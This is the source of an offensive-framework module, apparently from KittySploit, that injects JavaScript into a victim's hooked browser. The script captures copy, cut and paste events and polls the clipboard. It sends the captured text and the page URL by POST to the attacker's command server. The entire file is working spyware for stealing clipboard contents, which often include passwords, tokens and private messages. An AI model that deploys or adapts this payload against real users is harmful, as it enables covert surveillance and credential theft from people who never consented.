from kittysploit import *
import json
import time
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Clipboard Monitor",
		"description": "Monitor clipboard copy/cut/paste events and poll readable clipboard text from the victim browser",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	timeout = OptInteger(30, "Monitoring duration in seconds", True)
	poll_interval = OptInteger(3, "Clipboard polling interval in seconds", False)

	def run(self):
		monitor_id = str(uuid.uuid4())
		timeout_val = int(self.timeout or 30)
		poll_ms = max(int(self.poll_interval or 3), 1) * 1000

		code_js = f"""
		(function() {{
			const MONITOR_ID = '{monitor_id}';
			const POLL_MS = {poll_ms};

			let SERVER_HOST = '127.0.0.1';
			let SERVER_PORT = '8080';
			if (window.kittysploit) {{
				if (typeof window.kittysploit.getServerHost === 'function') {{
					SERVER_HOST = window.kittysploit.getServerHost();
				}}
				if (typeof window.kittysploit.getServerPort === 'function') {{
					SERVER_PORT = window.kittysploit.getServerPort();
				}}
			}}

			function currentSessionId() {{
				if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
					return window.kittysploit.sessionId();
				}}
				return null;
			}}

			function sendClip(eventType, text, extra) {{
				const payload = {{
					type: 'clipboard',
					event: eventType,
					text: text || '',
					url: window.location.href,
					timestamp: new Date().toISOString(),
					extra: extra || {{}}
				}};
				const data = {{
					session_id: currentSessionId(),
					command_id: MONITOR_ID,
					result: JSON.stringify(payload),
					timestamp: payload.timestamp
				}};
				fetch('http://' + SERVER_HOST + ':' + SERVER_PORT + '/api/command', {{
					method: 'POST',
					headers: {{ 'Content-Type': 'application/json' }},
					body: JSON.stringify(data)
				}}).catch(function() {{}});
			}}

			let active = true;
			let lastSent = '';

			function onCopyCut(kind, event) {{
				if (!active) return;
				let text = '';
				try {{
					text = window.getSelection ? String(window.getSelection()) : '';
				}} catch (e) {{}}
				if (!text && event && event.clipboardData) {{
					try {{ text = event.clipboardData.getData('text/plain') || ''; }} catch (e2) {{}}
				}}
				if (text) sendClip(kind, text, {{ source: 'selection' }});
			}}

			async function pollClipboard() {{
				if (!active || !navigator.clipboard || !navigator.clipboard.readText) {{
					return;
				}}
				try {{
					const text = await navigator.clipboard.readText();
					if (text && text !== lastSent) {{
						lastSent = text;
						sendClip('poll', text, {{ source: 'navigator.clipboard.readText' }});
					}}
				}} catch (e) {{
					// Permission/focus errors are expected on many origins
				}}
			}}

			document.addEventListener('copy', function(e) {{ onCopyCut('copy', e); }}, true);
			document.addEventListener('cut', function(e) {{ onCopyCut('cut', e); }}, true);
			document.addEventListener('paste', function(e) {{
				if (!active) return;
				let text = '';
				if (e.clipboardData) {{
					try {{ text = e.clipboardData.getData('text/plain') || ''; }} catch (err) {{}}
				}}
				if (text) sendClip('paste', text, {{ source: 'paste_event' }});
			}}, true);

			const pollTimer = setInterval(pollClipboard, POLL_MS);

			window._clipboardMonitorCleanup = function() {{
				active = false;
				clearInterval(pollTimer);
				document.removeEventListener('copy', onCopyCut, true);
				document.removeEventListener('cut', onCopyCut, true);
			}};

			return 'Clipboard monitor installed';
		}})();
		"""

		print_status(f"Installing clipboard monitor (ID: {monitor_id[:8]}...) for {timeout_val}s...")
		print_status("Capturing copy/cut/paste and polling clipboard when readable")

		if not self.send_js(code_js):
			print_error("Failed to install clipboard monitor")
			return False

		start_time = time.time()
		last_response_count = 0
		total_events = 0
		seen_texts = set()

		try:
			while time.time() - start_time < timeout_val:
				session = self.browser_server.get_session(self.session_id)
				if not session:
					print_error("Session not found")
					break

				if len(session.responses) > last_response_count:
					for response in session.responses[last_response_count:]:
						if response.get("command_id") != monitor_id:
							continue
						try:
							payload = json.loads(response.get("result", "") or "{}")
						except json.JSONDecodeError:
							continue
						if payload.get("type") != "clipboard":
							continue

						total_events += 1
						event = payload.get("event", "?")
						text = payload.get("text", "")
						preview = text.replace("\n", "\\n")
						if len(preview) > 120:
							preview = preview[:120] + "..."
						print_info(f"[CLIP:{event}] {preview}")

						if text and text not in seen_texts:
							seen_texts.add(text)

					last_response_count = len(session.responses)

				time.sleep(0.5)

		except KeyboardInterrupt:
			print_status("Stopping clipboard monitor...")

		stop_code = "if (window._clipboardMonitorCleanup) { window._clipboardMonitorCleanup(); }"
		self.send_js(stop_code)
		time.sleep(0.5)

		print_info("=" * 80)
		if seen_texts:
			print_status("Unique clipboard snippets captured:")
			for idx, text in enumerate(seen_texts, 1):
				display = text.replace("\n", "\\n")
				if len(display) > 200:
					display = display[:200] + "..."
				print_info(f"  [{idx}] {display}")
		else:
			print_warning("No clipboard text captured (permissions, focus, or empty clipboard)")

		print_success(
			f"Clipboard monitor stopped. Events: {total_events}, unique snippets: {len(seen_texts)}, "
			f"duration: {time.time() - start_time:.1f}s"
		)
		return True
